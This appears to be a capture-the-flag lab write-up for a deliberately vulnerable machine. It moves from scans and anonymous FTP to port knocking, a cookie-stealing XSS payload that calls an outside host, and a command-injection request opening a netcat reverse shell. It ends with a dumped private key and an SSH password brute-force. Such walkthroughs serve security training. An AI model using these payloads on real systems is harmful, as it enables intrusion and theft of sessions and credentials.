<h1>Misguided Ghosts</h1>
<p>2025, Sep 14 - Day 496</p>




<h2>nmap</h2>

```bash
:~# nmap -sS -sC -sV -A -O xx.xxx.xxx.xx
...
PORT     STATE    SERVICE    VERSION
21/tcp   open     ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xxx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
8080/tcp filtered http-proxy
```

<h2>/ftp</h2>

```bash
:~# ftp xx.xxx.xxx.xx
Connected to xx.xxx.xxx.xx.
220 (vsFTPd 3.0.3)
Name ( xx.xxx.xxx.xx:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
226 Directory send OK.
ftp> mget *
mget info.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (103 bytes).
226 Transfer complete.
103 bytes received in 0.00 secs (44.7247 kB/s)
mget jokes.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for jokes.txt (248 bytes).
226 Transfer complete.
248 bytes received in 0.07 secs (3.4440 kB/s)
mget trace.pcapng? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for trace.pcapng (737512 bytes).
226 Transfer complete.
737512 bytes received in 0.01 secs (113.6262 MB/s)
ftp> exit
221 Goodbye.
```

<h2>info.txt</h2>

```bash
:~# cat info.txt
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
```

<h2>jokes.txt</h2>

```bash
:~# cat jokes.txt
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

<h2>traces.pcapng</h2>
<p>

- 7864<br>
- 8273<br>
- 9241<br>
- 12007<br>
- 60753</p>

<img width="1155" height="191" alt="image" src="https://github.com/user-attachments/assets/fa0c4f22-01cb-4a30-bb22-863e9ecf005e" />

<br>
<br>
<h2>knock</h2>

```bash
:~# apt install knockd
```

```bash
:~# knock xx.xxx.xxx.xx 7864 8273 9241 12007 60753
```

<h2>nmap</h2>

```bash
:~# nmap -sC -sV -Pn -p- xx.xxx.xxx.xx
...
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11T16:52:11
|_Not valid after:  2021-08-11T16:52:11
```

<h2>/etc/hosts</h2>

```bash
xx.xxx.xxx.xx misguided_ghosts.thm
```

<h2>:8080</h2>

<img width="1045" height="412" alt="image" src="https://github.com/user-attachments/assets/61e81fe0-d7f0-42a9-8b90-777689bcf8c9" />

<br>
<br>
<p>

- hayley</p>

<img width="1045" height="227" alt="image" src="https://github.com/user-attachments/assets/602cd883-4beb-4420-9108-42195091b5df" />

<br>
<br>

<h2>gobuster</h2>

```bash
:~# gobuster dir -u https://misguided_ghosts.thm:8080/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
https://misguided_ghosts.thm:8080/console              (Status: 200) [Size: 1985]
https://misguided_ghosts.thm:8080/dashboard            (Status: 302) [Size: 219] [--> https://misguided_ghosts.thm:8080/login]
https://misguided_ghosts.thm:8080/login                (Status: 200) [Size: 761]
```

<h2>/login</h2>

<img width="1047" height="294" alt="image" src="https://github.com/user-attachments/assets/906d0cec-f795-4940-a380-d1ed3870eb20" />

<br>
<br>

<img width="1053" height="337" alt="image" src="https://github.com/user-attachments/assets/b3e9f5cf-88af-4959-84e7-d862d433d3ab" />

<br>
<br>

<h2>/console</h2>

<img width="1046" height="263" alt="image" src="https://github.com/user-attachments/assets/ec800f28-8b1a-4e1a-a741-6fb2df1822e9" />

<br>
<br>

<img width="1049" height="600" alt="image" src="https://github.com/user-attachments/assets/87a37259-9d1c-4940-99e3-b939caec57d0" />


<br>
<br>

<h2>/dashboard</h2>

<img width="1048" height="319" alt="image" src="https://github.com/user-attachments/assets/401c3014-c446-4409-b022-f867dd7b1142" />

<br>
<br>

<img width="1046" height="200" alt="image" src="https://github.com/user-attachments/assets/a47fe2ef-5299-4d5b-a48c-8fbf8a2ebf00" />

<br>
<br>

<img width="1024" height="462" alt="image" src="https://github.com/user-attachments/assets/150d288a-baf6-430e-9764-bf962e2010d2" />


<br>
<br>

<img width="1054" height="331" alt="image" src="https://github.com/user-attachments/assets/77c6a4a7-06e2-4bb5-aac2-cbea17d0d14f" />

<br>
<br>

<img width="1045" height="311" alt="image" src="https://github.com/user-attachments/assets/380b9a14-30e8-4f08-8c83-2b09954c4009" />

<br>
<br>

<img width="1036" height="469" alt="image" src="https://github.com/user-attachments/assets/9ca9b5f4-f543-4712-9e06-f008e762ed88" />

<br>
<br>


<h2>gobuster</h2>

```bash
:~# gobuster dir -u https://misguided_ghosts.thm:8080/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -q -c "login=hayley_is_admin" -k 2>/dev/null
https://misguided_ghosts.thm:8080/console              (Status: 200) [Size: 1985]
https://misguided_ghosts.thm:8080/dashboard            (Status: 200) [Size: 1215]
https://misguided_ghosts.thm:8080/login                (Status: 302) [Size: 227] [--> https://misguided_ghosts.thm:8080/dashboard]
https://misguided_ghosts.thm:8080/photos               (Status: 200) [Size: 629]
```

<h2>/photos</h2>

<img width="1056" height="186" alt="image" src="https://github.com/user-attachments/assets/766020d4-4f2d-4141-89e5-b162d112b30b" />


<img width="1040" height="112" alt="image" src="https://github.com/user-attachments/assets/99193bee-7f4b-45b6-ba17-0479e0f7c504" />


<p>Title:</p>

```bash
&lt;sscriptcript&gt;var i = new Image();i.src = "http://xx.xxx.xx.xx:8000/" + document.cookie;&lt;/sscriptcript&gt;
```


```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```


<img width="941" height="133" alt="image" src="https://github.com/user-attachments/assets/24e07d97-c835-4018-83a2-0196a54b3a2c" />

<br>
<br>


<img width="1047" height="215" alt="image" src="https://github.com/user-attachments/assets/5b85ea23-ad43-4adb-a835-c73288daba85" />

<br>
<br>


<img width="1057" height="462" alt="image" src="https://github.com/user-attachments/assets/e3c852ea-7a80-4049-8199-7ad426b8cc28" />


<br>
<br>

```bash
GET /photos?image=image=.;nc${IFS}xx.xxx.xx.xx{IFS}9001${IFS}-e${IFS}/bin/sh HTTP/1.1
Host: xx.xxx.xxx.xx:8080
Cookie: login=hayley_is_admin
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xxx.xx 42125
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
which python3
ls
Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
cd /home/zac
ls
notes
cat notes
ls -lah
total 12K    
drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 .
drwxr-xr-x    1 root     root        4.0K Sep 15 00:58 ..
drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 notes
cd notes
ls -lah
total 16K    
drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 .
drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 ..
-rw-r--r--    1 1001     1002        1.6K Aug 25  2020 .id_rsa
-rw-r--r--    1 1001     1002         270 Aug 25  2020 .secret
cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----



cd /app
ls -lah
total 56K    
drwxr-xr-x    5 root     root        4.0K Aug 28  2020 .
drwxr-xr-x    1 root     root        4.0K Sep 15 00:58 ..
drwxr-xr-x    8 root     root        4.0K Aug 11  2020 .git
-rw-r--r--    1 root     root        1.0K Aug 11  2020 .gitignore
-rw-r--r--    1 root     root         188 Aug 11  2020 .travis.yml
-rw-r--r--    1 root     root         170 Aug 18  2020 Dockerfile
-rw-r--r--    1 root     root        3.2K Aug 27  2020 app.py
-rw-r--r--    1 root     root        2.1K Aug 11  2020 cert.pem
-rw-------    1 root     root        3.2K Aug 11  2020 key.pem
-rw-r--r--    1 root     root          14 Aug 11  2020 requirements.txt
-rwxr-xr-x    1 root     root         222 Aug 26  2020 start.sh
drwxr-xr-x    5 root     root        4.0K Aug 28  2020 static
-rwxr-xr-x    1 root     root          92 Aug 26  2020 stop.sh
drwxr-xr-x    2 root     root        4.0K Aug 28  2020 templates
cat start.sh
#!/bin/bash

/usr/bin/docker build -t https /var/www/https

/usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
```


```bash
:~# hydra -l hayley -P pass ssh://xx.xxx.xxx.xx
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 03:34:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://xx.xxx.xxx.xx:22/
[22][ssh] host: xx.xxx.xxx.xx3   login: hayley   password: *******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-15 xx3xx:xx
```

```bash
:~# ssh hayley@xx.xxx.xxx.xx
hayley@xx.xxx.xxx.xx's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 15 xx:xx:xx UTC 2025

  System load:  0.25               Processes:              292
  Usage of /:   51.0% of 18.57GB   Users logged in:        1
  Memory usage: 73%                IP address for eth0:    xx.xxx.xxx.xx
  Swap usage:   0%                 IP address for docker0: xxx.xx.x.x


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.


hayley@misguided_ghosts:~$ pwd
/home/hayley
hayley@misguided_ghosts:~$ id
uid=1000(hayley) gid=1000(hayley) groups=1000(hayley),1002(paramore)
hayley@misguided_ghosts:~$ ls
user.txt
hayley@misguided_ghosts:~$ cat user.txt
{*************}
```
